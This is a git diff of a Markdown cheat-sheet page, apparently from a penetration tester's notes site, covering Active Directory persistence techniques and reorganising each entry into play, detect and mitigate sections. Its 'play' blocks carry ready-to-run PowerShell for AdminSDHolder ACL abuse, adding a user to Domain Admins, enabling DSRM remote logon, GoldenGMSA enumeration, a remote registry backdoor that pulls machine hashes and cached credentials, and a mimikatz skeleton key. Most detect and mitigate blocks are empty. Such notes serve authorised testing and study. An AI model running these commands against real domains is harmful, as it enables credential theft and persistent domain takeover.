@@ -3,7 +3,7 @@ layout: post
 title: pen / ad / persist
 category: pen
 parent: cheatsheets
-modified_date: 2024-11-28
+modified_date: 2024-12-02
 permalink: /pen/ad/persist
 ---
 
@@ -18,9 +18,6 @@ permalink: /pen/ad/persist
 	* [set-remoteWMI](#set-remoteWMI)
 	* [set-remotePSRemoting](#set-remotePSRemoting)
 	* [add-remoteRegBackdoor](#add-remoteRegBackdoor)
-	* [set-remoteWMI](#set-remoteWMI-1)
-	* [set-remotePSRemoting](#set-remotePSRemoting-1)
-	* [add-remoteRegBackdoor](#add-remoteRegBackdoor-1)
 * [skeleton-key](#skeleton-key)
 
 <!-- vscode-markdown-toc-config
@@ -36,12 +33,7 @@ permalink: /pen/ad/persist
 - special AD container with some "default" security permissions that is used as a template for protected AD accounts and groups
 - roll backs the security permissions for protected accounts and group every 60 minutes, aka the Security Descriptor Propagator Update (SDProp) process.
 
-🕮 READ MORE at :
-- [thehacker.recipes/ad/persistence/adminsdholder](https://www.thehacker.recipes/ad/persistence/adminsdholder).
-- [ired.team/abuse-adminsdholder](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
-- [adsecurity.org/adminsdholder](https://adsecurity.org/?p=1906)
-
-**play**
+▶️ PLAY :
 ```powershell
 # add the user to the adminsdholder group 
 Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName spotless -Verbose -Rights All
@@ -53,8 +45,7 @@ Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityRefer
 net group "domain admins" spotless /add /domain
 ```
 
-**detect**
-
+🔎️ DETECT :
 ```powershell
 # find all users with security ACLs set by SDProp using the PowerShell AD cmdlets
 Import-Module ActiveDirectory
@@ -66,9 +57,15 @@ Get-ADObject -LDAPFilter “(&(admincount=1)(|(objectcategory=person)(objectcate
 
 ```
 
+🛟 MITIGATE :
+```powershell
+```
 
-**mitigate**
-* [iredteam / adminsdholder](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-play/how-to-play-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
+🕮 READ MORE at :
+- [thehacker.recipes/ad/persistence/adminsdholder](https://www.thehacker.recipes/ad/persistence/adminsdholder).
+- [ired.team/abuse-adminsdholder](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
+- [adsecurity.org/adminsdholder](https://adsecurity.org/?p=1906)
+
 
 ## <a name='dacl-abuse'></a>dacl-abuse
 
@@ -76,42 +73,54 @@ Get-ADObject -LDAPFilter “(&(admincount=1)(|(objectcategory=person)(objectcate
 ![acerespond / win_00_sys_sd_ace](/assets/images/win_00_sys_sd_ace.jpg)
 ![thehackerrecipes / ad-persist-dacl-abuse-mindmap](/assets/images/ad-persist-dacl-abuse-mindmap-thehackerrecipes.png)
 
+▶️ PLAY :
+```powershell
+```
+
+🔎️ DETECT :
+```powershell
+```
+
+🛟 MITIGATE :
+```powershell
+```
+
 🕮 READ MORE at :
 - [thehacker.recipes/ad/movement/dacl](https://www.thehacker.recipes/ad/movement/dacl/).
 - [thehacker.recipes/ad/persistence/dacl](https://www.thehacker.recipes/ad/persistence/dacl/).
 - [ired.team/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
 
-**play**
-**detect**
-**mitigate**
 
 ## <a name='dc-shadow'></a>dc-shadow
 
 🔑 KEYPOINTS :
 - tbd 
 
+▶️ PLAY :
+```powershell
+```
+
+🔎️ DETECT :
+```powershell
+```
+
+🛟 MITIGATE :
+```powershell
+```
+
 🕮 READ MORE at :
 - [thehacker.recipes/ad/persistence/dcshadow](https://www.thehacker.recipes/ad/persistence/dcshadow/).
 - [ired.team/dcshadow](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
 
-**play**
-```powershell
-```
-**detect**
-**mitigate**
 
 ## <a name='dsrm'></a>dsrm
-
-**play**
 
 🔑 KEYPOINTS :
 - DSRM stands for 'Directory Services Restore Mode'
 - allows remote access to the DC for the local admin accounts
 - dump of local admins hash is required + activation of the feature in the **registry** 
 
-🕮 READ MORE at :
-- [hacktricks.xyz/dsrm-credentials](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dsrm-credentials)
-
+▶️ PLAY :
 ```powershell
 # check if the key exists and get the value
 Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior 
@@ -123,21 +132,25 @@ New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLog
 Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  
 ``` 
 
-**detect**
-**mitigate**
+🔎️ DETECT :
+```powershell
+```
+
+🛟 MITIGATE :
+```powershell
+```
+
+🕮 READ MORE at :
+- [hacktricks.xyz/dsrm-credentials](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dsrm-credentials)
 
 ## <a name='golden-gmsa'></a>golden-gmsa
-
-**play**
 
 🔑 KEYPOINTS :
 - Group Managed Service Accounts (gMSA), which are managed directly by AD, with a strong password and a regular password rotation
 - password are computed based on KDS root keys + gMSA account 'msDS-ManagedPassword' attribute value
 - hack implemented by [semperis/goldenGMSA](https://github.com/Semperis/GoldenGMSA) tool 
 
-🕮 READ MORE at :
-- [thehacker.recipes/ad/persistence/goldengmsa](https://www.thehacker.recipes/ad/persistence/goldengmsa).
-
+▶️ PLAY :
 ```powershell
 # enumerate KDS root keys,  SID, RootKeyGuid, Password ID
 GoldenGMSA.exe gmsainfo
@@ -146,13 +159,18 @@ GoldenGMSA.exe gmsainfo
 GoldenGMSA.exe gmsainfo --sid "S-1-5-21-[...]1586295871-1112"
 ```
 
-**detect**
-**mitigate**
+🔎️ DETECT :
+```powershell
+```
+
+🛟 MITIGATE :
+```powershell
+```
 
 - [trustedsec](https://www.trustedsec.com/blog/splunk-spl-queries-for-detecting-gmsa-attacks)
 
-```powershell
-```
+🕮 READ MORE at :
+- [thehacker.recipes/ad/persistence/goldengmsa](https://www.thehacker.recipes/ad/persistence/goldengmsa).
 
 
 ## <a name='security-descriptors'></a>security-descriptors
@@ -164,8 +182,6 @@ GoldenGMSA.exe gmsainfo --sid "S-1-5-21-[...]1586295871-1112"
 - [hacktricks/security-descriptors](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/security-descriptors)
 
 ### <a name='set-remoteWMI'></a>set-remoteWMI
-
-**play**
 ```powershell
 # grant WMI remote execution to a user
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
@@ -173,11 +189,8 @@ Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2
 # remove the grant of WMI remote execution
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose
 ```
-**detect**
-**mitigate**
 
 ### <a name='set-remotePSRemoting'></a>set-remotePSRemoting
-**play**
 ```powershell
 # grant PS remote execution to a user
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
@@ -185,11 +198,8 @@ Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
 # remove the grant of PS remote execution
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove
 ```
-**detect**
-**mitigate**
 
 ### <a name='add-remoteRegBackdoor'></a>add-remoteRegBackdoor
-**play**
 ```powershell
 # allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
 Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose
@@ -203,33 +213,30 @@ Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose
 # Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
 Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
 ```
-**detect**
-**mitigate**
-
 
 * [](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)
 
-**detect**
-
-**mitigate**
 
 ## <a name='skeleton-key'></a>skeleton-key
-
-**play**
 
 🔑 KEYPOINTS :
 - hack that injects a master password into the lsass process on a DC
 - enables the adversary to authenticate as any user without password
 - does not persist to reboot
 
-🕮 READ MORE at :
-- [thehacker.recipes/ad/persistence/skeleton-key](https://www.thehacker.recipes/ad/persistence/skeleton-key/).
-
+▶️ PLAY :
 ```powershell
 # execution on a DC
 invoke-mimi 'misc::skeleton'
 ```
 
-**detect**
+🔎️ DETECT :
+```powershell
+```
 
-**mitigate**
+🛟 MITIGATE :
+```powershell
+```
+
+🕮 READ MORE at :
+- [thehacker.recipes/ad/persistence/skeleton-key](https://www.thehacker.recipes/ad/persistence/skeleton-key/).
